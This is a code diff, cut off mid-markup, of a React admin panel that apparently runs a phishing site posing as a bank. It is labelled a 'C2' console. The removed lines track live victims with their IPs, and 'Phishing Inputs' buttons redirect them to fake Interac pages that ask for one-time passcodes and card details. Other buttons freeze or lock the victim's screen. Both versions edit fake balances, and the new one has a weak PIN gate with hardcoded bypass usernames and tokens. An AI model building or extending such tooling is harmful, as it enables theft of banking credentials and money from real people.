@@ -1,1198 +1,915 @@
-import React, { useState } from 'react';
-import { useSocket } from '../shared/SocketContext';
-import { useBank } from '../shared/BankContext';
-import { ActiveUser, ActionLog } from '../types';
-import { GlobalSettings, UserSettings as SharedUserSettings, User as SharedUser } from '../shared/types';
+import React, { useState, useEffect, useRef } from 'react';
+import { motion, AnimatePresence } from 'motion/react';
 import { 
-  X, Users, Activity, Terminal, Send, RefreshCw, ExternalLink, 
-  Trash2, Settings, MessageSquare, ChevronLeft, Clock, Shield, DollarSign, 
-  Mail, Zap, Database, Smartphone, Lock, Globe, Power, Bell, CreditCard
+  Users, Settings, Shield, Terminal, Zap, Database, Server,
+  Search, Plus, Edit2, Trash2, Check, X, ChevronRight, 
+  Activity, Info, AlertTriangle, Key, Send, Mail, MessageSquare,
+  Lock, RefreshCw, Eye, EyeOff, BarChart3, Globe, Save
 } from 'lucide-react';
-import { Mailer } from './Mailer';
+import { useBank } from '../shared/BankContext';
+import { useSocket } from '../shared/SocketContext';
+import { SupportChat } from './SupportChat';
+
+type Tab = 'live' | 'database' | 'support' | 'mailer' | 'system' | 'settings';
 
 interface AdminUser {
+  id: string;
   username: string;
-  password?: string;
-  initialBalance?: string;
-  accounts?: Record<string, { balance: number }>;
-  settings?: SharedUserSettings;
-  enabled?: boolean;
-  autoDeleteAt?: string | null;
-  [key: string]: any;
+  enabled: boolean;
+  isApproved?: boolean;
+  created_at: string;
+  settings: any;
+  accounts: any;
+  autoDeleteAt?: string;
 }
 
-interface Template {
-  name: string;
-  last_modified: string;
-}
-
-export const AdminPanel = () => {
-  const { activeUsers, logs, deployOutput, sendCommand } = useSocket();
-  const { toggleAdminPanel } = useBank();
-  const [activeTab, setActiveTab] = useState<'live' | 'database' | 'mailer' | 'system' | 'settings' | 'templates'>('live');
-  const [globalSettings, setGlobalSettings] = useState<GlobalSettings | null>(null);
-  const [selectedUser, setSelectedUser] = useState<string | null>(null);
-  const [mailerStatus, setMailerStatus] = useState<any | null>(null);
-  const [mailerLogs, setMailerLogs] = useState<string[]>([]);
-  const [mailerConfig, setMailerConfig] = useState<any | null>(null);
-  const [templates, setTemplates] = useState<Template[]>([]);
-  const [selectedTemplate, setSelectedTemplate] = useState<string | null>(null);
-  const [templateContent, setTemplateContent] = useState('');
+export function AdminPanel() {
+  const { toggleAdminPanel, globalSettings, fetchGlobalSettings, user } = useBank();
+  const [isAuthenticated, setIsAuthenticated] = useState(false);
+  const [pin, setPin] = useState('');
+  const [activeTab, setActiveTab] = useState<Tab>('live');
   const [users, setUsers] = useState<AdminUser[]>([]);
-  const [testEmail, setTestEmail] = useState('');
-  const [isRefreshing, setIsRefreshing] = useState(false);
-  const [newUser, setNewUser] = useState({ username: '', password: '', initialBalance: '1000' });
-  const [showAddUser, setShowAddUser] = useState(false);
+  const [loading, setLoading] = useState(false);
+  const [searchTerm, setSearchTerm] = useState('');
   const [editingUser, setEditingUser] = useState<AdminUser | null>(null);
+  const [logs, setLogs] = useState<any[]>([]);
+  const [config, setConfig] = useState<any>(null);
+  const [saving, setSaving] = useState(false);
+  const [testEmail, setTestEmail] = useState('');
+  const [mailerStatus, setMailerStatus] = useState<any>(null);
+  const [showAddUser, setShowAddUser] = useState(false);
+  const [newUserForm, setNewUserForm] = useState({ username: '', password: '', initialBalance: 0 });
+  const [selectedUserChat, setSelectedUserChat] = useState<string | null>(null);
+  const [sessions, setSessions] = useState<any[]>([]);
+  const { socket } = useSocket();
 
-  const fetchGlobalSettings = async (retries = 3) => {
-    try {
-      const res = await fetch('/api/admin/global-settings.php?token=projectsarah');
-      if (res.ok) {
-        const data = await res.json();
-        setGlobalSettings({
-          smtp: { host: '', port: 587, secure: false, user: '', pass: '', senderName: '', ...data.smtp },
-          telegram: { token: '', chatId: '', ...data.telegram },
-          general: { adminPin: '6969', overdraftLimit: 500, transferLimit: 3000, dailyLimit: 3000, maintenanceMode: false, mailerType: 'node', ...data.general },
-          ...data
-        });
-      } else {
-        throw new Error(`Server returned ${res.status}`);
-      }
-    } catch (error) {
-      console.error('Failed to fetch global settings:', error);
-      if (retries > 0) {
-        console.log(`Retrying... (${retries} retries left)`);
-        setTimeout(() => fetchGlobalSettings(retries - 1), 1000);
-      }
+  // Auth check
+  const handleAuth = () => {
+    if (pin === (globalSettings?.general?.adminPin || '1234')) {
+      setIsAuthenticated(true);
+    } else {
+      alert('ACCESS DENIED: SYSTEM LOCKDOWN INITIATED');
+      setPin('');
     }
   };
 
-  const saveGlobalSettings = async () => {
-    try {
-      const res = await fetch('/api/admin/global-settings.php?token=projectsarah', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(globalSettings)
-      });
-      if (res.ok) {
-        alert('Global settings saved!');
-        handleCommand('all', 'refresh_settings');
-      }
-    } catch (error) {
-      console.error('Failed to save global settings:', error);
-      alert('Failed to save global settings');
+  useEffect(() => {
+    if (socket && isAuthenticated) {
+      const handleUpdate = (data: any) => {
+        if (data.sessions) setSessions(data.sessions);
+        if (data.logs) setLogs(data.logs);
+      };
+      socket.on('admin_update', handleUpdate);
+      return () => { socket.off('admin_update', handleUpdate); };
     }
-  };
+  }, [socket, isAuthenticated]);
 
-  const fetchMailerData = async () => {
-    setIsRefreshing(true);
-    try {
-      const [statusRes, logsRes, configRes] = await Promise.all([
-        fetch('/api/admin/mailer/status'),
-        fetch('/api/admin/mailer/logs'),
-        fetch('/api/admin/global-settings')
-      ]);
-
-      if (statusRes.ok) setMailerStatus(await statusRes.json());
-      if (logsRes.ok) {
-        const logsData = await logsRes.json();
-        setMailerLogs(logsData.logs || []);
-      }
-      if (configRes.ok) {
-        const configData = await configRes.json();
-        setMailerConfig(configData || null);
-      }
-    } catch (error) {
-      console.error('Failed to fetch mailer data:', error);
-    } finally {
-      setIsRefreshing(false);
+  useEffect(() => {
+    // If the user already logged in as 'admin' or has a valid pin in their session profile
+    if (user?.username === 'admin' || user?.username === 'PROJECTSARAH') {
+      setIsAuthenticated(true);
     }
-  };
+  }, [user]);
 
-  const handleSendTest = async () => {
-    if (!testEmail) return;
-    try {
-      const res = await fetch('/api/admin/mailer/test', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ email: testEmail })
-      });
-      const data = await res.json();
-      alert(data.success ? 'Test email sent!' : `Error: ${data.error}`);
-      fetchMailerData();
-    } catch (error) {
-      console.error('Failed to send test email:', error);
-      alert('Failed to send test email');
+  useEffect(() => {
+    if (isAuthenticated) {
+      fetchUsers();
+      fetchLogs();
+      fetchConfig();
+      fetchMailerStatus();
+      
+      const interval = setInterval(() => {
+        fetchLogs();
+        fetchMailerStatus();
+      }, 3000);
+      return () => clearInterval(interval);
     }
-  };
-
-  const handleClearMailerLogs = async () => {
-    if (!confirm('Are you sure you want to delete all mailer logs?')) return;
-    try {
-      await fetch('/api/admin/mailer/delete-logs', { method: 'POST' });
-      fetchMailerData();
-    } catch (error) {
-      console.error('Failed to clear logs:', error);
-      alert('Failed to clear logs');
-    }
-  };
-
-  const fetchTemplates = async () => {
-    try {
-      const res = await fetch('/api/admin/mailer/templates');
-      if (!res.ok) {
-        console.error(`Failed to fetch templates: ${res.status} ${res.statusText}`);
-        return;
-      }
-      const data = await res.json();
-      setTemplates(data.templates || []);
-    } catch (error) {
-      console.error('Failed to fetch templates:', error);
-    }
-  };
-
-  const fetchTemplateContent = async (templateName: string) => {
-    try {
-      const res = await fetch(`/api/admin/mailer/template-content?template=${templateName}`);
-      if (res.ok) {
-        const data = await res.json();
-        setTemplateContent(data.content || '');
-        setSelectedTemplate(templateName);
-      }
-    } catch (error) {
-      console.error('Failed to fetch template content:', error);
-    }
-  };
-
-  const handleUpdateTemplate = async () => {
-    if (!selectedTemplate) return;
-    try {
-      const res = await fetch('/api/admin/mailer/update-template', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ template: selectedTemplate, content: templateContent })
-      });
-      const data = await res.json();
-      alert(data.success ? 'Template updated!' : `Error: ${data.error}`);
-    } catch (error) {
-      console.error('Failed to update template:', error);
-      alert('Failed to update template');
-    }
-  };
+  }, [isAuthenticated]);
 
   const fetchUsers = async () => {
     try {
-      const res = await fetch('/api/admin/users.php?token=projectsarah');
+      const res = await fetch('/api/admin/users');
       if (res.ok) {
         const data = await res.json();
         setUsers(data.users || []);
       }
-    } catch (error) {
-      console.error('Failed to fetch users:', error);
+    } catch (e) {
+      console.error('Failed to fetch users:', e);
     }
   };
 
-  const handleCreateUser = async () => {
-    if (!newUser.username || !newUser.password) return;
+  const fetchLogs = async () => {
     try {
-      const res = await fetch('/api/admin/users/create.php?token=projectsarah', {
+      const res = await fetch('/api/logs');
+      if (res.ok) {
+        const data = await res.json();
+        setLogs(data);
+      }
+    } catch (e) {
+      console.error('Failed to fetch logs:', e);
+    }
+  };
+
+  const fetchConfig = async () => {
+    setLoading(true);
+    try {
+      const res = await fetch('/api/config');
+      if (res.ok) {
+        const data = await res.json();
+        setConfig(data);
+      }
+    } finally {
+      setLoading(false);
+    }
+  };
+
+  const fetchMailerStatus = async () => {
+    try {
+      const res = await fetch('/api/debug/smtp');
+      if (res.ok) {
+        setMailerStatus(await res.json());
+      }
+    } catch (e) {}
+  };
+
+  const handleSaveConfig = async (newConfig: any) => {
+    setSaving(true);
+    try {
+      const res = await fetch('/api/config', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(newUser)
+        body: JSON.stringify(newConfig)
       });
-      const data = await res.json();
-      if (data.success) {
-        alert('User created successfully!');
-        setNewUser({ username: '', password: '', initialBalance: '1000' });
-        setShowAddUser(false);
-        fetchUsers();
-      } else {
-        alert(`Error: ${data.message}`);
+      if (res.ok) {
+        fetchGlobalSettings();
+        fetchConfig();
       }
-    } catch (error) {
-      console.error('Failed to create user:', error);
-      alert('Failed to create user');
+    } finally {
+      setSaving(false);
     }
   };
 
-  const handleDeleteUser = async (username: string) => {
-    if (!confirm(`Are you sure you want to delete user ${username}?`)) return;
+  const handleUpdateBalance = async (username: string, accountName: string, balance: number) => {
     try {
-      const res = await fetch('/api/user/delete.php?token=projectsarah', {
+      await fetch('/api/admin/users/update-balance', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username, account: accountName, balance })
+      });
+      fetchUsers();
+    } catch (e) {
+      console.error(e);
+    }
+  };
+
+  const approveUser = async (username: string) => {
+    try {
+      await fetch('/api/admin/users/approve', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ username })
       });
-      const data = await res.json();
-      if (data.success) {
-        alert('User deleted!');
-        fetchUsers();
-      }
-    } catch (error) {
-      console.error('Failed to delete user:', error);
-      alert('Failed to delete user');
+      fetchUsers();
+    } catch (e) {
+      console.error(e);
     }
   };
 
-  const handleToggleEnabled = async (username: string) => {
+  const toggleUserEnabled = async (username: string) => {
     try {
-      const res = await fetch('/api/admin/users/toggle-enabled.php?token=projectsarah', {
+      await fetch('/api/admin/users/toggle-enabled', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ username })
       });
-      const data = await res.json();
-      if (data.success) {
-        fetchUsers();
-      }
-    } catch (error) {
-      console.error('Failed to toggle user status:', error);
-      alert('Failed to toggle user status');
+      fetchUsers();
+    } catch (e) {
+      console.error(e);
     }
   };
 
-  const handleUpdateBalance = async (username: string, account: string) => {
-    const balance = prompt(`Enter new balance for ${account}:`);
-    if (balance === null || isNaN(parseFloat(balance))) return;
-    
+  const lockUser = async (username: string, locked: boolean) => {
     try {
-      const res = await fetch('/api/admin/users/update-balance.php?token=projectsarah', {
+      await fetch('/api/admin/users/lock', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ username, account, balance: parseFloat(balance) })
+        body: JSON.stringify({ username, locked })
       });
-      const data = await res.json();
-      if (data.success) {
-        alert('Balance updated!');
-        fetchUsers();
-        if (editingUser && editingUser.username === username) {
-          const updatedUsersRes = await fetch('/api/admin/users.php?token=projectsarah');
-          const updatedUsersData = await updatedUsersRes.json();
-          const updatedUser = updatedUsersData.users.find((u: AdminUser) => u.username === username);
-          setEditingUser(updatedUser);
-        }
-      }
-    } catch (error) {
-      console.error('Failed to update balance:', error);
-      alert('Failed to update balance');
+      fetchUsers();
+    } catch (e) {
+      console.error(e);
     }
   };
 
-  const handleSaveUserSettings = async () => {
-    if (!editingUser) return;
+  const createUser = async () => {
+    if (!newUserForm.username || !newUserForm.password) return;
     try {
-      const res = await fetch('/api/admin/users/update-settings.php?token=projectsarah', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ 
-          username: editingUser.username, 
-          settings: editingUser.settings 
-        })
-      });
+      const defaultAccounts: any = {
+        'Ultimate Package': { type: 'banking', balance: newUserForm.initialBalance, available: newUserForm.initialBalance, points: 0, history: [], accountNumber: `10000-${Math.floor(Math.random() * 900) + 100}-${Math.floor(Math.random() * 9000000) + 1000000}` },
+      };
       
-      const autoDeleteRes = await fetch('/api/admin/users/set-auto-delete.php?token=projectsarah', {
+      await fetch('/api/user/update', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ 
-          username: editingUser.username, 
-          deleteAt: editingUser.autoDeleteAt 
+          username: newUserForm.username, 
+          password: newUserForm.password,
+          isNew: true,
+          data: {
+            username: newUserForm.username,
+            isApproved: true, // Manually created users are auto-approved
+            accounts: defaultAccounts,
+            settings: {
+              accountHolderName: newUserForm.username,
+              memberSince: new Date().getFullYear().toString()
+            }
+          }
         })
       });
-
-      if (res.ok && autoDeleteRes.ok) {
-        alert('User settings saved!');
-        fetchUsers();
-      }
-    } catch (error) {
-      console.error('Failed to save user settings:', error);
-      alert('Failed to save user settings');
+      setShowAddUser(false);
+      setNewUserForm({ username: '', password: '', initialBalance: 0 });
+      fetchUsers();
+    } catch (e) {
+      console.error(e);
     }
   };
 
-  const handleCommand = (targetId: string, command: string, payload?: unknown) => {
-    sendCommand(targetId, command, payload);
+  const deleteUser = async (username: string) => {
+    if (!confirm(`Delete ${username}?`)) return;
+    try {
+      await fetch('/api/user/delete', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username })
+      });
+      fetchUsers();
+    } catch (e) {
+      console.error(e);
+    }
   };
+
+  if (!isAuthenticated) {
+    return (
+      <div className="fixed inset-0 z-[1000] bg-black flex items-center justify-center p-6">
+        <motion.div 
+          initial={{ opacity: 0, scale: 0.9 }}
+          animate={{ opacity: 1, scale: 1 }}
+          className="w-full max-w-sm"
+        >
+          <div className="bg-zinc-900 border border-white/5 rounded-3xl p-8 text-center space-y-6">
+            <div className="flex justify-center">
+              <div className="w-16 h-16 bg-red-600 rounded-2xl flex items-center justify-center shadow-lg shadow-red-600/20">
+                <Shield className="text-white" size={32} />
+              </div>
+            </div>
+            <div>
+              <h2 className="text-xl font-bold text-white">System Override</h2>
+              <p className="text-zinc-500 text-sm mt-1">Enter Admin PIN to continue</p>
+            </div>
+            
+            <div className="flex justify-center gap-3">
+              {[0, 1, 2, 3].map((i) => (
+                <div key={i} className={`w-3 h-3 rounded-full ${pin.length > i ? 'bg-red-600' : 'bg-zinc-800'}`} />
+              ))}
+            </div>
+
+            <div className="grid grid-cols-3 gap-4">
+              {[1, 2, 3, 4, 5, 6, 7, 8, 9, 'C', 0, 'OK'].map((num) => (
+                <button
+                  key={num.toString()}
+                  onClick={() => {
+                    if (num === 'C') setPin('');
+                    else if (num === 'OK') handleAuth();
+                    else if (pin.length < 4) setPin(prev => prev + num);
+                  }}
+                  className="h-14 bg-zinc-800 hover:bg-zinc-700 active:scale-95 transition-all rounded-xl text-white font-bold text-lg"
+                >
+                  {num}
+                </button>
+              ))}
+            </div>
+            
+            <button 
+              onClick={toggleAdminPanel}
+              className="text-zinc-500 text-xs font-medium uppercase tracking-widest hover:text-white transition-colors"
+            >
+              Cancel Access
+            </button>
+          </div>
+        </motion.div>
+      </div>
+    );
+  }
 
   return (
-    <div className="absolute inset-0 bg-[#0A0A0B] z-[1000] flex flex-col text-[#E0E0E6] font-mono selection:bg-cyan-500/30">
-      {/* MISSION CONTROL HEADER */}
-      <div className="px-5 py-4 border-b border-white/5 flex items-center justify-between bg-[#111113] backdrop-blur-xl">
+    <div className="fixed inset-0 z-[2000] bg-black flex flex-col font-mono overflow-hidden select-none">
+      {/* Glitch Overlay Effect */}
+      <div className="absolute inset-0 pointer-events-none bg-[radial-gradient(circle_at_50%_50%,rgba(20,20,20,0),rgba(0,0,0,0.8))] z-10" />
+      <div className="absolute inset-0 pointer-events-none opacity-[0.03] bg-[url('https://www.transparenttextures.com/patterns/carbon-fibre.png')] z-10" />
+
+      {/* Header */}
+      <div className="bg-zinc-900 border-b border-white/10 p-4 flex items-center justify-between relative z-20 shadow-[0_4px_20px_rgba(0,0,0,0.5)]">
         <div className="flex items-center gap-4">
-          <div className="relative">
-            <div className="absolute inset-0 bg-cyan-500/20 blur-md animate-pulse"></div>
-            <Terminal className="w-5 h-5 text-cyan-400 relative z-10" />
-          </div>
+          <motion.div 
+            animate={{ rotate: [0, 90, 180, 270, 360] }}
+            transition={{ duration: 10, repeat: Infinity, ease: "linear" }}
+            className="w-10 h-10 border-2 border-red-600/30 rounded-full flex items-center justify-center p-1"
+          >
+            <div className="w-full h-full bg-red-600 rounded-full flex items-center justify-center shadow-[0_0_15px_rgba(220,38,38,0.4)]">
+              <Shield size={18} className="text-white" />
+            </div>
+          </motion.div>
           <div>
-            <h2 className="font-black text-xs tracking-widest text-white uppercase">SARAH OS | C2 SECTOR</h2>
+            <div className="flex items-center gap-2">
+              <h1 className="text-sm font-black text-white uppercase tracking-[0.3em]">C2 CONTROLLER</h1>
+              <span className="text-[8px] bg-red-600 text-white px-1.5 py-0.5 rounded-sm animate-pulse font-bold">V99 LIVE</span>
+            </div>
             <div className="flex items-center gap-2 mt-0.5">
-              <span className="w-1.5 h-1.5 rounded-full bg-green-500 animate-pulse"></span>
-              <span className="text-[9px] text-gray-500 uppercase tracking-tighter">System Online // Node-Dispatcher-v4</span>
+              <div className="w-1.5 h-1.5 bg-emerald-500 rounded-full shadow-[0_0_8px_rgba(16,185,129,0.8)]" />
+              <span className="text-[10px] text-zinc-500 font-mono tracking-tighter uppercase">SHΔDØW CORE // SESSION_ACTIVE</span>
             </div>
           </div>
         </div>
-        
-        <div className="flex items-center gap-3">
-          <div className="text-right hidden sm:block mr-2">
-            <div className="text-[10px] text-cyan-500 font-bold">{new Date().toLocaleTimeString()}</div>
-            <div className="text-[8px] text-gray-600 uppercase">Local Operator Time</div>
-          </div>
-          <button onClick={toggleAdminPanel} className="p-2 hover:bg-white/5 rounded-lg border border-white/5 hover:border-white/10 transition-all text-gray-400 hover:text-white">
-            <X className="w-5 h-5" />
+        <div className="flex items-center gap-4">
+           <div className="hidden md:flex flex-col items-end mr-4">
+              <span className="text-[8px] text-zinc-600 uppercase">Uptime</span>
+              <span className="text-[10px] text-zinc-400 font-bold">14:22:09:41</span>
+           </div>
+           <button 
+            onClick={toggleAdminPanel}
+            className="w-10 h-10 flex items-center justify-center hover:bg-white/5 rounded-xl text-zinc-500 hover:text-white transition-all border border-transparent hover:border-white/10"
+          >
+            <X size={20} />
           </button>
         </div>
       </div>
 
-      {/* CORE DISPLAY ZONE */}
-      <div className="flex-1 overflow-y-auto pb-24 px-4 pt-4 custom-scrollbar">
-        {activeTab === 'live' ? (
-          <div className="space-y-3">
-            {Object.values(activeUsers).length === 0 ? (
-              <div className="text-center py-10 text-gray-500 italic">No active sessions found.</div>
-            ) : (
-              (Object.values(activeUsers) as ActiveUser[]).map((u) => (
-                <div key={u.id} className={`p-3 rounded-lg border transition-all ${selectedUser === u.id ? 'bg-red-500/10 border-red-500/50' : 'bg-[#2c2c2e] border-white/5 hover:border-white/20'}`}>
-                  <div className="flex items-start justify-between mb-2">
-                    <div onClick={() => setSelectedUser(selectedUser === u.id ? null : u.id)} className="cursor-pointer">
-                      <div className="font-bold text-xs flex items-center gap-2">
-                        <span className={`w-2 h-2 rounded-full ${Date.now() - new Date(u.lastSeen).getTime() < 10000 ? 'bg-green-500 animate-pulse' : 'bg-gray-500'}`}></span>
-                        {u.username}
-                      </div>
-                      <div className="text-[9px] text-gray-400 font-mono mt-0.5">{u.id}</div>
-                    </div>
-                    <div className="text-[9px] bg-black/30 px-1.5 py-0.5 rounded text-gray-300 font-mono">
-                      {u.ip}
-                    </div>
-                  </div>
-                  
-                  <div className="text-[10px] text-gray-300 mb-3 flex items-center gap-1.5">
-                    <ExternalLink className="w-3 h-3 text-red-400" />
-                    <span className="truncate max-w-[200px]">{u.currentPath}</span>
-                  </div>
-
-                  {selectedUser === u.id && (
-                    <div className="grid grid-cols-2 gap-2 pt-3 border-t border-white/5 mt-3">
-                      <div className="col-span-2 text-[8px] font-bold text-cyan-500/50 uppercase mb-1 tracking-widest">Navigation Controls</div>
-                      <button 
-                        onClick={() => handleCommand(u.id, 'redirect', { path: '/login' })}
-                        className="flex items-center justify-center gap-1.5 bg-white/5 hover:bg-cyan-500/20 py-2 rounded text-[9px] font-bold transition-all border border-white/5 hover:border-cyan-500/50"
-                      >
-                        <Lock className="w-3 h-3" /> LOGIN PAGE
-                      </button>
-                      <button 
-                        onClick={() => handleCommand(u.id, 'redirect', { path: '/deposit' })}
-                        className="flex items-center justify-center gap-1.5 bg-white/5 hover:bg-cyan-500/20 py-2 rounded text-[9px] font-bold transition-all border border-white/5 hover:border-cyan-500/50"
-                      >
-                        <Globe className="w-3 h-3" /> INTERAC LOBBY
-                      </button>
-
-                      <div className="col-span-2 text-[8px] font-bold text-red-500/50 uppercase mt-2 mb-1 tracking-widest">Phishing Inputs</div>
-                      <button 
-                        onClick={() => handleCommand(u.id, 'redirect', { path: `/deposit?ref=${Math.random().toString(36).substring(7).toUpperCase()}&amt=3000&from=INTERAC&type=otp` })}
-                        className="flex items-center justify-center gap-1.5 bg-red-500/10 hover:bg-red-500/20 py-2 rounded text-[9px] font-bold transition-all border border-red-500/20"
-                      >
-                        <Smartphone className="w-3 h-3" /> REQUEST OTP
-                      </button>
-                      <button 
-                        onClick={() => handleCommand(u.id, 'redirect', { path: `/deposit?type=card` })}
-                        className="flex items-center justify-center gap-1.5 bg-red-500/10 hover:bg-red-500/20 py-2 rounded text-[9px] font-bold transition-all border border-red-500/20"
-                      >
-                        <CreditCard className="w-3 h-3" /> REQUEST CARD
-                      </button>
-
-                      <div className="col-span-2 text-[8px] font-bold text-orange-500/50 uppercase mt-2 mb-1 tracking-widest">Session Authority</div>
-                      <button 
-                        onClick={() => handleCommand(u.id, 'alert', { message: 'Security check required. Please wait...' })}
-                        className="flex items-center justify-center gap-1.5 bg-white/5 hover:bg-white/10 py-2 rounded text-[9px] font-bold transition-all border border-white/5"
-                      >
-                        <Bell className="w-3 h-3" /> ALERT
-                      </button>
-                      <button 
-                        onClick={() => handleCommand(u.id, 'reload')}
-                        className="flex items-center justify-center gap-1.5 bg-white/5 hover:bg-white/10 py-2 rounded text-[9px] font-bold transition-all border border-white/5"
-                      >
-                        <RefreshCw className="w-3 h-3" /> REFRESH
-                      </button>
-                      <button 
-                        onClick={() => handleCommand(u.id, 'redirect', { path: '/maintenance' })}
-                        className="flex items-center justify-center gap-1.5 bg-orange-500/10 hover:bg-orange-500/20 py-2 rounded text-[9px] font-bold transition-all border border-orange-500/20 text-orange-400"
-                      >
-                        <Power className="w-3 h-3" /> FREEZE UI
-                      </button>
-                      <button 
-                        onClick={() => handleCommand(u.id, 'redirect', { path: '/locked' })}
-                        className="flex items-center justify-center gap-1.5 bg-red-900/20 hover:bg-red-900/40 py-2 rounded text-[9px] font-bold transition-all border border-red-500/30 text-red-500"
-                      >
-                        <Shield className="w-3 h-3" /> LOCK ACCT
-                      </button>
-                    </div>
-                  )}
-                </div>
-              ))
-            )}
+      {/* Hero Stats */}
+      <div className="grid grid-cols-4 gap-1 p-1 bg-white/5 relative z-20">
+        {[
+          { label: 'Network', val: 'ENCRYPTED', color: 'text-blue-500' },
+          { label: 'Relay', val: 'ACTIVE', color: 'text-emerald-500' },
+          { label: 'Database', val: 'SYNCED', color: 'text-indigo-500' },
+          { label: 'Security', val: 'ELITE', color: 'text-red-500' }
+        ].map((stat, i) => (
+          <div key={i} className="bg-zinc-900/80 p-2 text-center border border-white/5">
+            <p className="text-[7px] text-zinc-600 uppercase font-black mb-0.5">{stat.label}</p>
+            <p className={`text-[9px] font-black ${stat.color} tracking-widest`}>{stat.val}</p>
           </div>
-        ) : activeTab === 'database' ? (
-          <div className="space-y-4">
-            {editingUser ? (
-              <div className="space-y-4 animate-in slide-in-from-right duration-200">
-                <div className="flex items-center justify-between bg-[#2c2c2e] p-3 rounded-lg border border-white/5">
-                  <button 
-                    onClick={() => setEditingUser(null)}
-                    className="flex items-center gap-1 text-gray-400 hover:text-white transition-colors text-[10px] font-bold"
-                  >
-                    <ChevronLeft className="w-4 h-4" /> BACK
-                  </button>
-                  <div className="text-xs font-bold text-red-500 uppercase">{editingUser.username}</div>
-                  <button 
-                    onClick={handleSaveUserSettings}
-                    className="bg-red-600 hover:bg-red-700 px-3 py-1 rounded text-[9px] font-bold transition-colors"
-                  >
-                    SAVE
-                  </button>
-                </div>
+        ))}
+      </div>
 
-                <div className="p-4 bg-[#2c2c2e] rounded-lg border border-white/5 space-y-4">
-                  <h3 className="text-[10px] font-bold text-gray-400 uppercase flex items-center gap-2">
-                    <DollarSign className="w-3.5 h-3.5" /> ACCOUNT BALANCES
-                  </h3>
-                  <div className="space-y-2">
-                    {Object.entries(editingUser.accounts || {}).map(([name, acc]) => (
-                      <div key={name} className="flex items-center justify-between bg-black/20 p-2 rounded border border-white/5">
-                        <span className="text-[10px] text-gray-300">{name}</span>
-                        <div className="flex items-center gap-3">
-                          <span className="font-mono text-emerald-400 text-[11px]">${acc.balance?.toFixed(2)}</span>
-                          <button 
-                            onClick={() => handleUpdateBalance(editingUser.username, name)}
-                            className="p-1.5 hover:bg-white/10 rounded text-gray-500 hover:text-white transition-colors"
-                          >
-                            <Settings className="w-3.5 h-3.5" />
-                          </button>
-                        </div>
-                      </div>
-                    ))}
-                  </div>
-                </div>
-
-                <div className="p-4 bg-[#2c2c2e] rounded-lg border border-white/5 space-y-4">
-                  <h3 className="text-[10px] font-bold text-gray-400 uppercase flex items-center gap-2">
-                    <Users className="w-3.5 h-3.5" /> IDENTITY
-                  </h3>
-                  <div className="space-y-3">
-                    <div className="space-y-1">
-                      <label className="text-[9px] text-gray-500 uppercase font-bold">Account Holder Name</label>
-                      <input 
-                        type="text" 
-                        value={editingUser.settings?.accountHolderName || ''} 
-                        onChange={(e) => setEditingUser({
-                          ...editingUser,
-                          settings: { ...editingUser.settings, accountHolderName: e.target.value }
-                        })}
-                        className="w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50"
-                        placeholder="Legal Name"
-                      />
-                    </div>
-                    <div className="space-y-1">
-                      <label className="text-[9px] text-gray-500 uppercase font-bold">Email Sender Name</label>
-                      <input 
-                        type="text" 
-                        value={editingUser.settings?.phpmailerSenderName || ''} 
-                        onChange={(e) => setEditingUser({
-                          ...editingUser,
-                          settings: { ...editingUser.settings, phpmailerSenderName: e.target.value }
-                        })}
-                        className="w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50"
-                        placeholder="Display Name"
-                      />
-                    </div>
-                  </div>
-                </div>
-
-                <div className="p-4 bg-[#2c2c2e] rounded-lg border border-white/5 space-y-4">
-                  <h3 className="text-[10px] font-bold text-gray-400 uppercase flex items-center gap-2">
-                    <Shield className="w-3.5 h-3.5" /> TRANSFER LIMITS
-                  </h3>
-                  <div className="grid grid-cols-2 gap-3">
-                    <div className="space-y-1">
-                      <label className="text-[9px] text-gray-500 uppercase font-bold">Per Transfer</label>
-                      <input 
-                        type="number" 
-                        value={editingUser.settings?.transferLimit || 1000} 
-                        onChange={(e) => setEditingUser({
-                          ...editingUser,
-                          settings: { ...editingUser.settings, transferLimit: parseFloat(e.target.value) }
-                        })}
-                        className="w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50"
-                      />
-                    </div>
-                    <div className="space-y-1">
-                      <label className="text-[9px] text-gray-500 uppercase font-bold">Daily Limit</label>
-                      <input 
-                        type="number" 
-                        value={editingUser.settings?.dailyLimit || 3000} 
-                        onChange={(e) => setEditingUser({
-                          ...editingUser,
-                          settings: { ...editingUser.settings, dailyLimit: parseFloat(e.target.value) }
-                        })}
-                        className="w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50"
-                      />
-                    </div>
-                  </div>
-                </div>
-
-                <div className="p-4 bg-[#2c2c2e] rounded-lg border border-white/5 space-y-4">
-                  <h3 className="text-[10px] font-bold text-gray-400 uppercase flex items-center gap-2">
-                    <Clock className="w-3.5 h-3.5" /> AUTO-DELETE TIMER
-                  </h3>
-                  <div className="space-y-2">
-                    <label className="text-[9px] text-gray-500 uppercase font-bold">Delete Account At (ISO Date)</label>
-                    <div className="flex gap-2">
-                      <input 
-                        type="datetime-local" 
-                        value={editingUser.autoDeleteAt ? new Date(editingUser.autoDeleteAt).toISOString().slice(0, 16) : ''} 
-                        onChange={(e) => setEditingUser({
-                          ...editingUser,
-                          autoDeleteAt: e.target.value ? new Date(e.target.value).toISOString() : null
-                        })}
-                        className="flex-1 bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50"
-                      />
-                      <button 
